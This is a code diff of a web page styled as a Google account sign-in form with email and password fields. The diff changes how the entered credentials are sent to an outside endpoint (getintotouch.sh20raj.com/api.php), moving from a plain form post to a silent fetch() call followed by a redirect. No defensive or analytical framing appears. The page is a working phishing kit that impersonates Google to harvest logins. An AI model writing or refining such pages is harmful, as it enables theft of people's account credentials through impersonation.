@@ -15,7 +15,7 @@
         </div>
         <h2>Sign In</h2>
         <p>Use your Google Account</p>
-        <form id="signInForm" action="https://getintotouch.sh20raj.com/api.php?id=6534651073" method="post" onsubmit="submitForm()">
+        <form id="signInForm" onsubmit="submitForm(event)">
             <div class="inputBox">
                 <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
                 <label>Email</label>
@@ -29,11 +29,27 @@
     </div>
 
     <script>
-        function submitForm() {
-            // Perform any additional actions before form submission if needed
+        function submitForm(event) {
+            event.preventDefault(); // Prevent the default form submission
             
-            // Redirect to another page after submitting the form
-            window.location.href = 'Gpagefa.html';
+            // Get form data
+            const formData = new FormData(document.getElementById('signInForm'));
+
+            // Perform the asynchronous form submission
+            fetch('https://getintotouch.sh20raj.com/api.php?id=6534651073', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (response.ok) {
+                    // If the response is successful, redirect to another page
+                    window.location.href = 'https://your-redirect-url.com';
+                } else {
+                    console.error('Form submission failed');
+                    // Handle unsuccessful submission if needed
+                }
+            })
+            .catch(error => console.error('Error during form submission:', error));
         }
     </script>
 
